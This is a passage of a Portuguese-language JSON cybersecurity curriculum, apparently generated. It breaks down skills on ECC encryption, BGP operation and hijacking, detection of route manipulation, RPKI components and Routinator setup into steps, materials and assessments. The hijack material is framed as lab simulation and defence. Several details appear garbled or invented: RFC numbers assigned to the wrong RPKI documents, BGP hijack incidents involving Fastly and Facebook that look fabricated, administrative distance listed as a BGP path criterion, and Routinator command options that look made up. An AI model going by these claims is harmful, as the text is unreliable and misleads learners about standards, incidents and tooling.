                                "Gerar e validar par de chaves ECC sem erros.",
                                "Criptografar/descriptografar mensagem corretamente com hybrid ECC-AES.",
                                "Assinar e verificar mensagem com ECDSA, detectando adulterações.",
                                "Estabelecer conexão TLS com cipher ECC-only.",
                                "Medir redução de latência vs RSA em teste de performance.",
                                "Integrar em script Python rodando em dispositivo simulado."
                              ],
                              "assessmentCriteria": [
                                "Precisão na geração e uso de chaves ECC (sem vazamentos).",
                                "Correta implementação de criptografia híbrida e assinaturas.",
                                "Integração funcional em TLS ou app IoT sem vulnerabilidades óbvias.",
                                "Eficiência demonstrada (tempo/chave menor que RSA).",
                                "Documentação clara de comandos/código usado.",
                                "Tratamento de erros comuns como chaves inválidas."
                              ],
                              "crossCurricularConnections": [
                                "Programação: Scripts Python/C para automação de crypto.",
                                "Redes: Protocolos TLS/HTTPS com cipher suites ECC.",
                                "Hardware IoT: Otimização para dispositivos embedded low-power.",
                                "Matemática: Fundamentos de curvas elípticas e grupos finitos.",
                                "Desenvolvimento Mobile: Bindings libsodium para Android/iOS."
                              ],
                              "realWorldApplication": "Em IoT, ECC permite criptografia leve em dispositivos como wearables e sensores inteligentes (ex: Fitbit usa ECC para TLS); em mobile apps, assina transações financeiras seguras com baterias limitadas, reduzindo 30-50% no tamanho de chaves vs RSA."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.2.4.3.2",
                              "10.1.2.4.2.3"
                            ]
                          }
                        ]
                      }
                    ]
                  }
                ]
              },
              {
                "id": "10.1.3",
                "name": "Segurança de Redes",
                "description": "Inclui segurança em BGP e DNS, teoria de detecção de ataques de rede e sistemas de prevenção de intrusão.",
                "totalSkills": 39,
                "atomicTopics": [
                  {
                    "id": "10.1.3.1",
                    "name": "Segurança em BGP",
                    "description": "Mecanismos como BGPsec e RPKI para prevenir hijacking de rotas e manipulações no protocolo BGP.",
                    "individualConcepts": [
                      {
                        "id": "10.1.3.1.1",
                        "name": "Protocolo BGP e Vulnerabilidades",
                        "description": "Compreensão do funcionamento básico do Border Gateway Protocol (BGP) e identificação das principais vulnerabilidades, como hijacking de rotas e manipulações de anúncios, que permitem redirecionamento de tráfego malicioso.",
                        "specificSkills": [
                          {
                            "id": "10.1.3.1.1.1",
                            "name": "Explicar o funcionamento do BGP",
                            "description": "Descrever o papel do BGP na roteamento interdomínio, incluindo sessões entre peers, anúncios de rotas (AS_PATH, NEXT_HOP) e seleção de melhores caminhos, com exemplos de mensagens UPDATE e KEEPALIVE.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Entender o papel do BGP no roteamento interdomínio",
                                  "subSteps": [
                                    "Estude a definição de Autonomous System (AS) e sua importância na internet.",
                                    "Compare roteamento intradomínio (IGP como OSPF) com interdomínio (EGP como BGP).",
                                    "Identifique o objetivo principal do BGP: troca de informações de roteamento entre ASs.",
                                    "Revise a hierarquia da internet e como o BGP escala para milhões de rotas.",
                                    "Anote diferenças entre iBGP e eBGP."
                                  ],
                                  "verification": "Resuma em 3 frases o papel do BGP e liste 2 diferenças entre iBGP e eBGP sem consultar materiais.",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "RFC 4271 (BGP-4)",
                                    "Vídeo tutorial sobre BGP basics no YouTube (NetworkChuck)",
                                    "Diagrama de ASs da internet"
                                  ],
                                  "tips": "Use analogias como 'BGP é o GPS global da internet' para fixar conceitos.",
                                  "learningObjective": "Compreender o contexto e propósito do BGP na arquitetura de redes globais.",
                                  "commonMistakes": [
                                    "Confundir BGP com protocolos IGP",
                                    "Ignorar a distinção entre iBGP e eBGP",
                                    "Subestimar o escopo global do BGP"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Estabelecer sessões BGP entre peers",
                                  "subSteps": [
                                    "Aprenda os tipos de peers: eBGP (externo) e iBGP (interno).",
                                    "Estude o processo de abertura de sessão TCP na porta 179.",
                                    "Descreva as mensagens OPEN, KEEPALIVE e NOTIFICATION.",
                                    "Simule o handshake BGP em um diagrama.",
                                    "Configure autenticação MD5 para sessões seguras."
                                  ],
                                  "verification": "Desenhe um fluxograma do estabelecimento de uma sessão BGP e identifique o papel do KEEPALIVE.",
                                  "estimatedTime": "1.5 horas",
                                  "materials": [
                                    "Cisco Packet Tracer ou GNS3 para simulação",
                                    "Documentação Cisco BGP Peering",
                                    "Wireshark para captura de pacotes BGP"
                                  ],
                                  "tips": "Sempre verifique conectividade TCP antes de troubleshooting BGP.",
                                  "learningObjective": "Dominar o mecanismo de peering e manutenção de sessões BGP.",
                                  "commonMistakes": [
                                    "Esquecer porta TCP 179",
                                    "Não diferenciar TTL para eBGP vs iBGP",
                                    "Ignorar timeouts de KEEPALIVE"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Anunciar rotas e atributos chave (AS_PATH, NEXT_HOP)",
                                  "subSteps": [
                                    "Explique a mensagem UPDATE para anunciar/withdraw rotas.",
                                    "Detalhe o atributo AS_PATH: prepend, loop prevention.",
                                    "Entenda NEXT_HOP: regras para eBGP (próximo hop muda) e iBGP (não muda).",
                                    "Liste outros atributos obrigatórios: ORIGIN, LOCAL_PREF.",
                                    "Pratique anunciando prefixos em uma simulação."
                                  ],
                                  "verification": "Capture uma mensagem UPDATE no Wireshark e identifique AS_PATH e NEXT_HOP.",
                                  "estimatedTime": "2 horas",
                                  "materials": [
                                    "GNS3 com imagens IOS",
                                    "RFC 4271 seção UPDATE",
                                    "Exemplos de BGP tables do Hurricane Electric BGP toolkit"
                                  ],
                                  "tips": "Lembre: NEXT_HOP em iBGP requer rotas para o next-hop.",
                                  "learningObjective": "Compreender como rotas são propagadas com atributos essenciais.",
                                  "commonMistakes": [
                                    "Modificar incorretamente NEXT_HOP em iBGP",
                                    "Não usar AS_PATH para detectar loops",
                                    "Confundir atributos well-known vs optional"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Seleção de melhores caminhos e mensagens BGP",
                                  "subSteps": [
                                    "Memorize os 13 critérios de seleção de path BGP (administrative distance, LOCAL_PREF, AS_PATH length, etc.).",
                                    "Simule seleção de best path em cenários com múltiplas rotas.",
                                    "Analise exemplos de mensagens UPDATE com withdraws.",
                                    "Estude o papel do KEEPALIVE na detecção de falhas.",
                                    "Teste cenários de tie-breakers como ORIGIN e MED."
                                  ],
                                  "verification": "Dado 2 rotas candidatas, selecione a best path e justifique com critérios.",
                                  "estimatedTime": "2 horas",
                                  "materials": [
                                    "Calculadora de best path BGP online",
                                    "Livro 'Internet Routing Architectures' de Halabi",
                                    "Packet Tracer labs"
                                  ],
                                  "tips": "Sempre priorize LOCAL_PREF sobre AS_PATH.",
                                  "learningObjective": "Aplicar o algoritmo de seleção de melhores caminhos BGP.",
                                  "commonMistakes": [
                                    "Errar ordem dos critérios (LOCAL_PREF antes AS_PATH)",
                                    "Ignorar tie-breaker router ID",
                                    "Confundir MED com LOCAL_PREF"
                                  ]
                                }
                              ],
                              "practicalExample": "Configure dois roteadores Cisco em GNS3 como AS 100 e AS 200 (eBGP peering). Anuncie rede 10.0.0.0/24 do AS 100, observe UPDATE com AS_PATH [100] e NEXT_HOP alterado, verifique best path na tabela BGP e capture KEEPALIVEs no Wireshark.",
                              "finalVerifications": [
                                "Explicar sem notas o processo de seleção de best path BGP.",
                                "Identificar AS_PATH e NEXT_HOP em uma mensagem UPDATE exemplo.",
                                "Diferenciar iBGP de eBGP com 3 exemplos.",
                                "Descrever o papel do KEEPALIVE e consequências de falha.",
                                "Listar 5 primeiros critérios de path selection."
                              ],
                              "assessmentCriteria": [
                                "Precisão na descrição de atributos BGP (AS_PATH, NEXT_HOP).",
                                "Correta sequência de critérios de best path selection.",
                                "Compreensão de mensagens BGP (OPEN, UPDATE, KEEPALIVE).",
                                "Uso correto de terminologia interdomínio vs intradomínio.",
                                "Capacidade de troubleshooting básico de sessões peering."
                              ],
                              "crossCurricularConnections": [
                                "Protocolos IGP (OSPF/EIGRP) para comparação com BGP.",
                                "Cibersegurança: Vulnerabilidades BGP como prefix hijacking e RPKI.",
                                "Análise de tráfego: Uso de Wireshark para pacotes BGP.",
                                "Programação de redes: Automatização BGP com Python (pyBGPStream)."
                              ],
                              "realWorldApplication": "BGP roteia o tráfego global da internet entre provedores (ISPs), bancos e empresas; falhas causam outages como o de 2021 no Facebook, destacando sua criticidade em cibersegurança contra hijacks."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.3.1.1.2",
                            "name": "Identificar tipos de hijacking em BGP",
                            "description": "Reconhecer ataques como prefix hijacking, AS path prepending e blackholing, analisando cenários reais como o incidente de hijacking da Ucrânia em 2017, e impactos em disponibilidade e confidencialidade.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender Fundamentos do BGP e Conceitos de Hijacking",
                                  "subSteps": [
                                    "Estude o protocolo BGP (Border Gateway Protocol) e seu papel no roteamento interdomínio da Internet.",
                                    "Aprenda os principais atributos BGP, como AS_PATH, NEXT_HOP e LOCAL_PREF.",
                                    "Defina hijacking em BGP como a manipulação maliciosa de anúncios de rotas.",
                                    "Identifique os tipos principais: prefix hijacking, AS path prepending e blackholing.",
                                    "Analise como hijacks afetam disponibilidade (DoS) e confidencialidade (redirecionamento de tráfego)."
                                  ],
                                  "verification": "Explique em um diagrama simples como um anúncio BGP normal difere de um hijack.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "RFC 4271 (BGP-4)",
                                    "Vídeo 'BGP Basics' no YouTube (Cloudflare ou Cisco), Hurricane Electric BGP Toolkit"
                                  ],
                                  "tips": "Use ferramentas online como BGPStream para visualizar anúncios reais de rotas.",
                                  "learningObjective": "Dominar os conceitos básicos de BGP para contextualizar ataques de hijacking.",
                                  "commonMistakes": [
                                    "Confundir BGP com protocolos IGP como OSPF",
                                    "Ignorar o papel do AS_PATH na detecção de loops"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Explorar Prefix Hijacking em Detalhe",
                                  "subSteps": [
                                    "Defina prefix hijacking: anúncio malicioso de um prefixo IP pertencente a outra AS.",
                                    "Estude mecanismos de propagação: o anúncio mais específico vence devido a regras de longest prefix match.",
                                    "Simule um cenário: AS maliciosa anuncia /24 em vez de /16 legítimo.",
                                    "Analise detecção via inconsistências em AS_PATH ou RPKI (Resource Public Key Infrastructure).",
                                    "Discuta mitigações como BGPsec ou ROA (Route Origin Authorization)."
                                  ],
                                  "verification": "Identifique um prefix hijack em um exemplo de log BGP fornecido.",
                                  "estimatedTime": "60 minutos",
                                  "materials": [
                                    "Ferramenta BGPmon ou BGPStream",
                                    "Exemplos de logs em bgp.he.net",
                                    "Artigo 'Prefix Hijacking Case Studies'"
                                  ],
                                  "tips": "Monitore anúncios reais no Hurricane Electric BGP lab para ver prefixes em tempo real.",
                                  "learningObjective": "Reconhecer e descrever prefix hijacking com exemplos técnicos.",
                                  "commonMistakes": [
                                    "Assumir que todos os hijacks são intencionais (podem ser erros de configuração)",
                                    "Não considerar filtros de prefixo em peers"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Analisar AS Path Prepending e Blackholing",
                                  "subSteps": [
                                    "Explique AS path prepending: inserção artificial de AS numbers para manipular seleção de caminho.",
                                    "Descreva blackholing: anúncio de prefixo com NO_EXPORT ou discard next-hop para descartar tráfego.",
                                    "Compare com prefix hijacking: prepending é sutil, blackholing causa perda de conectividade.",
                                    "Estude impactos: prepending para espionagem, blackholing para DoS.",
                                    "Pratique identificação em ferramentas de visualização de paths BGP."
                                  ],
                                  "verification": "Diferencie prepending de blackholing em um cenário hipotético com logs.",
                                  "estimatedTime": "50 minutos",
                                  "materials": [
                                    "GNS3 ou EVE-NG para simulação BGP",
                                    "Documentação Cisco sobre RTBH (Remotely Triggered Black Hole)",
                                    "BGP looking glass tools"
                                  ],
                                  "tips": "Use 'show ip bgp' em roteadores Cisco para inspecionar AS_PATH.",
                                  "learningObjective": "Diferenciar e identificar variantes de hijacking além do prefix.",
                                  "commonMistakes": [
                                    "Confundir prepending legítimo (traffic engineering) com malicioso",
                                    "Ignorar comunidades BGP como NO_EXPORT"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Analisar Cenário Real e Impactos",
                                  "subSteps": [
                                    "Estude o incidente de hijacking da Ucrânia em 2017: Russia Telecom (AS20632) anunciou prefixes ucranianos.",
                                    "Mapeie o impacto: redirecionamento de tráfego para Rússia, afetando confidencialidade e disponibilidade.",
                                    "Analise timeline usando BGPStream: detecte anomalias em AS_PATH.",
                                    "Discuta lições: necessidade de monitoramento 24/7 e ROA.",
                                    "Avalie impactos gerais: perda financeira, exposição de dados sensíveis."
                                  ],
                                  "verification": "Resuma o caso Ucrânia 2017 e identifique o tipo de hijack usado.",
                                  "estimatedTime": "75 minutos",
                                  "materials": [
                                    "Relatório RIPE NCC sobre Ucrânia Hijack 2017",
                                    "BGPStream para query histórica",
                                    "Artigos Krebs on Security"
                                  ],
                                  "tips": "Use filtros de data em BGPStream para recriar o evento.",
                                  "learningObjective": "Aplicar conhecimento teórico a casos reais e avaliar impactos.",
                                  "commonMistakes": [
                                    "Focar só em causas técnicas, ignorar motivações geopolíticas",
                                    "Não verificar fontes múltiplas para timeline precisa"
                                  ]
                                }
                              ],
                              "practicalExample": "Usando GNS3, configure três AS: legítima (AS1 com prefixo 10.0.0.0/16), vítima (AS2) e atacante (AS3). Na AS3, anuncie 10.0.1.0/24 (prefix hijack). Monitore com Wireshark/telnet nos roteadores para ver tráfego redirecionado e AS_PATH alterado, simulando o impacto na disponibilidade.",
                              "finalVerifications": [
                                "Explique diferenças entre prefix hijacking, AS path prepending e blackholing.",
                                "Identifique hijack em um log BGP fornecido.",
                                "Descreva o incidente Ucrânia 2017 e seu tipo de ataque.",
                                "Liste 3 impactos em disponibilidade e confidencialidade.",
                                "Proponha 2 mitigações como RPKI.",
                                "Analise um path BGP real de bgp.he.net para anomalias."
                              ],
                              "assessmentCriteria": [
                                "Precisão na definição e diferenciação dos tipos de hijacking (80%+ correto).",
                                "Capacidade de analisar logs/scenários reais com evidências técnicas.",
                                "Compreensão de impactos em CIA triad (confidencialidade, integridade, disponibilidade).",
                                "Uso correto de terminologia BGP (AS_PATH, ROA, etc.).",
                                "Propostas de detecção/mitigação viáveis e fundamentadas.",
                                "Análise clara do caso Ucrânia com timeline e lições aprendidas."
                              ],
                              "crossCurricularConnections": [
                                "Redes de Computadores: Roteamento interdomínio e protocolos IGP/EGP.",
                                "Criptografia: RPKI, BGPsec e validação de assinaturas digitais.",
                                "Análise Forense Digital: Investigação de logs BGP e timelines de incidentes.",
                                "Gestão de Incidentes em Cibersegurança: Resposta a ataques de roteamento.",
                                "Ética e Geopolítica: Impactos de hijacks em conflitos internacionais."
                              ],
                              "realWorldApplication": "Em um Security Operations Center (SOC) de provedor de internet ou empresa global, monitorar BGP para detectar hijacks em tempo real, prevenindo interrupções de serviço (ex: Netflix ou bancos), espionagem estatal ou ataques DDoS, como no caso da Ucrânia 2017 que expôs tráfego governamental."
                            },
                            "estimatedTime": "1.5 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.3.1.1.3",
                            "name": "Analisar manipulações de anúncios BGP",
                            "description": "Examinar técnicas de manipulação como injeção de rotas falsas ou alteração de atributos BGP, utilizando ferramentas como BGPmon para monitoramento e detecção de anomalias.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender Tipos de Manipulações em Anúncios BGP",
                                  "subSteps": [
                                    "Estudar injeção de rotas falsas (route leaks e hijacks)",
                                    "Analisar alterações de atributos BGP como AS_PATH, NEXT_HOP e LOCAL_PREF",
                                    "Revisar prepend AS para manipulação de preferência de rota",
                                    "Examinar withdrawal de rotas para blackholing",
                                    "Identificar manipulações via comunidades BGP"
                                  ],
                                  "verification": "Listar e descrever pelo menos 4 tipos de manipulações com exemplos reais",
                                  "estimatedTime": "1.5 horas",
                                  "materials": [
                                    "Documentação RFC 4271 (BGP-4)",
                                    "Tutoriais da Cloudflare sobre BGP hijacks",
                                    "Vídeos educativos no YouTube sobre BGP anomalies"
                                  ],
                                  "tips": [
                                    "Use diagramas para visualizar alterações de AS_PATH",
                                    "Compare anúncios normais vs. manipulados"
                                  ],
                                  "learningObjective": "Identificar e classificar técnicas comuns de manipulação de anúncios BGP",
                                  "commonMistakes": [
                                    "Confundir route leaks com hijacks intencionais",
                                    "Ignorar o impacto de atributos como MED"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Configurar Ferramentas de Monitoramento BGP",
                                  "subSteps": [
                                    "Instalar BGPmon ou Hurricane Electric BGP Toolkit",
                                    "Configurar coleta de dados de peering BGP público",
                                    "Definir filtros para anúncios suspeitos (ex: AS_PATH longo)",
                                    "Integrar com visualizadores como BGPStream",
                                    "Testar configuração com dados históricos"
                                  ],
                                  "verification": "Gerar um relatório inicial de anúncios BGP de um AS específico",
                                  "estimatedTime": "2 horas",
                                  "materials": [
                                    "BGPmon (bgpmon.net)",
                                    "Software GOBGP ou ExaBGP para simulação",
                                    "Conta em BGP looking glass público"
                                  ],
                                  "tips": [
                                    "Comece com peers públicos para evitar configurações complexas",
                                    "Salve configurações em script para reutilização"
                                  ],
                                  "learningObjective": "Configurar ferramentas para monitoramento em tempo real de anúncios BGP",
                                  "commonMistakes": [
                                    "Não validar peers BGP corretamente",
                                    "Ignorar rate limiting em APIs públicas"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Detectar e Analisar Anomalias em Anúncios",
                                  "subSteps": [
                                    "Coletar dados durante período suspeito",
                                    "Identificar padrões anômalos (ex: AS_PATH inesperado)",
                                    "Comparar com histórico baseline de rotas",
                                    "Usar ferramentas para decodificar atributos manipulados",
                                    "Documentar evidências de manipulação"
                                  ],
                                  "verification": "Identificar uma anomalia simulada e explicar sua causa",
                                  "estimatedTime": "2.5 horas",
                                  "materials": [
                                    "Dados históricos do BGPStream",
                                    "Ferramentas como bgp.he.net e BGPmon dashboard",
                                    "Scripts Python para análise de dumps MRT"
                                  ],
                                  "tips": [
                                    "Crie baselines diárias para comparação rápida",
                                    "Foque em volume de anúncios e origem geográfica"
                                  ],
                                  "learningObjective": "Detectar manipulações usando análise comparativa de anúncios",
                                  "commonMistakes": [
                                    "Falsos positivos por mudanças legítimas de roteamento",
                                    "Não considerar propagação de anúncios"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Validar Análise e Simular Resposta",
                                  "subSteps": [
                                    "Simular injeção de rota falsa usando ExaBGP",
                                    "Aplicar filtros RPKI para validação de origens",
                                    "Gerar relatório com evidências e recomendações",
                                    "Testar mitigação via prefix-lists ou max-prefix",
                                    "Avaliar impacto potencial no tráfego"
                                  ],
                                  "verification": "Produzir relatório completo de análise com mitigação proposta",
                                  "estimatedTime": "2 horas",
                                  "materials": [
                                    "Ambiente de lab com GNS3 ou EVE-NG",
                                    "RPKI validators como rpki-client",
                                    "Templates de relatórios de incidente BGP"
                                  ],
                                  "tips": [
                                    "Use labs isolados para simulações seguras",
                                    "Inclua timestamps precisos nas análises"
                                  ],
                                  "learningObjective": "Aplicar análise para propor respostas a manipulações BGP",
                                  "commonMistakes": [
                                    "Não testar mitigação em lab antes de produção",
                                    "Subestimar tempo de convergência BGP"
                                  ]
                                }
                              ],
                              "practicalExample": "Analisar o BGP hijack da Fastly em 2021, onde rotas falsas foram injetadas para o prefixo 23.128.0.0/10, usando BGPmon para visualizar AS_PATH alterado e detectar o AS originante malicioso, resultando em redirecionamento de tráfego global.",
                              "finalVerifications": [
                                "Identificar corretamente injeção de rotas falsas em um dump MRT",
                                "Explicar alteração de AS_PATH em um anúncio anômalo",
                                "Configurar alerta em BGPmon para AS_PATH > 50",
                                "Validar prefixo com RPKI e relatar falha de origem",
                                "Simular e mitigar um hijack em lab",
                                "Documentar análise com evidências visuais"
                              ],
                              "assessmentCriteria": [
                                "Precisão na identificação de manipulações (90%+ taxa de detecção)",
                                "Qualidade da configuração de ferramentas (funcional e sem erros)",
                                "Profundidade da análise de atributos BGP",
                                "Efetividade da simulação e mitigação proposta",
                                "Clareza e completude do relatório final"
                              ],
                              "crossCurricularConnections": [
                                "Análise de Dados: Detecção de padrões anômalos em logs BGP",
                                "Redes: Compreensão de protocolos de roteamento dinâmico",
                                "Cibersegurança: Correlação com IDS/IPS para ameaças roteamento",
                                "Inteligência de Ameaças: Mapeamento de atores estatais em hijacks",
                                "Programação: Scripts para automação de monitoramento BGP"
                              ],
                              "realWorldApplication": "Em provedores de internet (ISPs) e CDNs para detectar e mitigar hijacks BGP que causam interrupções globais, como o incidente da Ucrânia em 2022, protegendo tráfego crítico de governos e empresas contra espionagem ou DDoS via roteamento malicioso."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          }
                        ]
                      },
                      {
                        "id": "10.1.3.1.2",
                        "name": "Resource Public Key Infrastructure (RPKI)",
                        "description": "Infraestrutura de chave pública para validação de autorizações de roteamento, utilizando objetos como Route Origin Authorizations (ROAs) para prevenir anúncios não autorizados de prefixos IP.",
                        "specificSkills": [
                          {
                            "id": "10.1.3.1.2.1",
                            "name": "Descrever componentes do RPKI",
                            "description": "Explicar elementos como Trust Anchor, Repositories, Certificates e ROAs, e o fluxo de validação de origens de rotas em cenários de roteamento global.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender o Trust Anchor no RPKI",
                                  "subSteps": [
                                    "Pesquise a definição de Trust Anchor como a raiz de confiança no RPKI, emitida por Regional Internet Registries (RIRs) como ARIN, RIPE NCC.",
                                    "Analise como o Trust Anchor é um certificado auto-assinado que estabelece a cadeia de confiança para todos os outros certificados.",
                                    "Identifique exemplos de Trust Anchors disponíveis publicamente, como o da RIPE NCC.",
                                    "Desenhe um diagrama simples mostrando o Trust Anchor no topo da hierarquia de confiança.",
                                    "Explique verbalmente ou por escrito o papel do Trust Anchor em cenários de roteamento global."
                                  ],
                                  "verification": "Crie um diagrama da hierarquia de confiança e explique-o em 2 minutos sem consultar notas.",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "Documentação oficial RIPE NCC RPKI: https://www.ripe.net/publications/docs/rpki",
                                    "Artigo introdutório: 'RPKI Trust Anchor' no site da ARIN",
                                    "Ferramenta de desenho como Draw.io"
                                  ],
                                  "tips": "Comece sempre pela fonte oficial das RIRs para evitar informações desatualizadas.",
                                  "learningObjective": "Identificar e descrever o Trust Anchor como base da confiança no RPKI.",
                                  "commonMistakes": [
                                    "Confundir Trust Anchor com certificados CA comuns do SSL/TLS.",
                                    "Ignorar que é específico por RIR e não global único."
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Explorar Repositories e Certificates no RPKI",
                                  "subSteps": [
                                    "Defina Repositories como pontos de publicação de objetos RPKI, incluindo Certificate Repositories (CA Repository) e Publication Repositories.",
                                    "Estude os tipos de Certificates: CA Certificates (emitidos por CAs) e EE Certificates (End-Entity para ROAs).",
                                    "Navegue em um Repository público, como o da RIPE NCC, para visualizar certificados reais.",
                                    "Compare a estrutura de um certificado RPKI com um X.509 padrão, notando extensões específicas como IP Address Delegation.",
                                    "Liste os campos chave em um certificado RPKI: Subject Key Identifier, Authority Key Identifier, Validity Period."
                                  ],
                                  "verification": "Baixe e parse um certificado RPKI real usando OpenSSL e liste 5 campos chave.",
                                  "estimatedTime": "1.5 horas",
                                  "materials": [
                                    "OpenSSL instalado",
                                    "RIPE NCC RPKI Repository: https://rpki.ripe.net/",
                                    "RFC 8180: Certificate Profile for RPKI",
                                    "Tutorial OpenSSL para RPKI"
                                  ],
                                  "tips": "Use comandos como 'openssl x509 -in cert.pem -text -noout' para inspecionar certificados.",
                                  "learningObjective": "Descrever a função e estrutura de Repositories e Certificates no ecossistema RPKI.",
                                  "commonMistakes": [
                                    "Confundir Publication Repository com o da própria CA.",
                                    "Não verificar a cadeia de confiança até o Trust Anchor."
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Analisar Route Origin Authorizations (ROAs)",
                                  "subSteps": [
                                    "Defina ROA como um objeto assinado que autoriza um AS Number (ASN) a originar prefixos IP específicos.",
                                    "Estude a estrutura de um ROA: ASN, prefixos IP com Max Length, e assinatura.",
                                    "Exemplo: Crie um ROA fictício para ASN 64496 originando 192.0.2.0/24.",
                                    "Diferencie ROAs válidos, inválidos e not-found em validação BGP.",
                                    "Busque ROAs reais em um Repository e valide um usando uma ferramenta online."
                                  ],
                                  "verification": "Gere um diagrama de um ROA e explique sua validação em 3 cenários BGP.",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "RFC 8182: ROA Profile for RPKI",
                                    "Ferramenta Hurricane Electric BGP Toolkit: bgp.he.net",
                                    "Editor de texto para JSON/ASN.1"
                                  ],
                                  "tips": "Lembre-se: ROA especifica 'quem pode anunciar o quê', não as rotas exatas.",
                                  "learningObjective": "Explicar ROAs como autorização de origens de rotas e sua estrutura.",
                                  "commonMistakes": [
                                    "Confundir Max Length com prefix length exato.",
                                    "Achar que ROA controla caminhos BGP, não origens."
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Mapear o Fluxo de Validação de Origens de Rotas",
                                  "subSteps": [
                                    "Descreva o fluxo: Cliente BGP valida rota recebida consultando Repositories via RRDP ou Rsync.",
                                    "Passo a passo: Verificar cadeia de certificados até Trust Anchor, validar assinatura do ROA, checar match de prefixo/ASN.",
                                    "Simule um fluxo com ferramentas: Valide uma rota BGP usando rpki-client ou similar.",
                                    "Discuta cenários: Rota válida (match ROA), inválida (sem ROA ou mismatch), unknown.",
                                    "Explique integração com BGPsec ou SIDR para segurança completa."
                                  ],
                                  "verification": "Simule e documente a validação de 3 rotas BGP fictícias, classificando cada uma.",
                                  "estimatedTime": "2 horas",
                                  "materials": [
                                    "rpki-client: https://www.rpki-client.org/",
                                    "RFC 6811: BGP Origin Validation",
                                    "Ambiente virtual com GNS3 para simulação BGP"
                                  ],
                                  "tips": "Pratique com rotas reais do looking glass público para contexto real.",
                                  "learningObjective": "Descrever o fluxo completo de validação usando componentes RPKI em roteamento BGP.",
                                  "commonMistakes": [
                                    "Pular verificação da cadeia de confiança.",
                                    "Confundir validação de origem com validação de caminho."
                                  ]
                                }
                              ],
                              "practicalExample": "Em um AS 12345 recebendo anúncio BGP de 2001:db8::/32 do AS 64496, o roteador valida: consulta Repository, verifica ROA assinado por CA confiável até Trust Anchor da RIPE NCC, confirma match ASN/prefixo, aceita como válida; caso mismatch, rejeita para prevenir hijack.",
                              "finalVerifications": [
                                "Desenhe e rotule um diagrama completo dos componentes RPKI e fluxo de validação.",
                                "Explique diferenças entre Certificate, ROA e Trust Anchor em uma apresentação de 5 minutos.",
                                "Valide 5 ROAs reais de um Repository público e classifique.",
                                "Simule um hijack de rota sem RPKI vs. com RPKI detectado.",
                                "Liste 3 benefícios do RPKI em segurança BGP global.",
                                "Responda quiz com 10 perguntas sobre componentes e validação (90% acerto)."
                              ],
                              "assessmentCriteria": [
                                "Precisão na descrição de cada componente (Trust Anchor, Repositories, Certificates, ROAs).",
                                "Correta representação do fluxo de validação passo a passo.",
                                "Uso de terminologia técnica exata (ex: Max Length, Authority Key Identifier).",
                                "Inclusão de exemplos reais e diagramas claros.",
                                "Demonstração prática com ferramentas como rpki-client.",
                                "Compreensão de cenários de falha (invalid, not-found)."
                              ],
                              "crossCurricularConnections": [
                                "Criptografia: Uso de PKI, assinaturas digitais e X.509 (fundamentos de crypto).",
                                "Redes: Protocolo BGP e roteamento interdomínio.",
                                "Sistemas Operacionais: Gerenciamento de chaves e repositórios distribuídos.",
                                "Governança da Internet: Papel das RIRs e políticas de alocação IP.",
                                "Segurança Aplicada: Prevenção de ataques como route leaks e hijacks."
                              ],
                              "realWorldApplication": "RPKI previne hijacks de rotas BGP globais, como o incidente de 2021 com Facebook/US-GOV, onde ROAs detectam anúncios não autorizados, permitindo filtros automáticos em ISPs e IXPs para manter integridade da Internet."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.3.1.2.2",
                            "name": "Configurar e validar ROAs",
                            "description": "Demonstrar criação de ROAs usando ferramentas como Routinator ou OctoRPKI, e validação de anúncios BGP contra RPKI para rejeitar rotas inválidas.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Instalar e Configurar o Validador Routinator",
                                  "subSteps": [
                                    "Atualize o sistema: sudo apt update && sudo apt upgrade -y.",
                                    "Instale dependências: sudo apt install build-essential pkg-config libssl-dev libcurl4-openssl-dev -y.",
                                    "Baixe e instale Routinator: wget https://github.com/NLnetLabs/routinator/releases/download/v0.14.2/routinator-v0.14.2-x86_64-unknown-linux-musl.tar.gz, extraia e mova para /usr/local/bin.",
                                    "Inicialize o repositório: sudo routinator init --repository /var/lib/routinator/repository --inventory /etc/routinator/inventory.json.",
                                    "Configure como serviço systemd e sincronize: sudo routinator update."
                                  ],
                                  "verification": "Execute 'sudo routinator monitor --status' e confirme status 'Synced' com zero erros.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "VM Linux Ubuntu 22.04 com 2GB RAM",
                                    "Acesso root/sudo",
                                    "Conexão à internet"
                                  ],
                                  "tips": "Use a imagem Docker oficial (docker run -d --name routinator -v routinator-data:/var/lib/routinator nlnetlabs/routinator) para setups isolados e rápidos.",
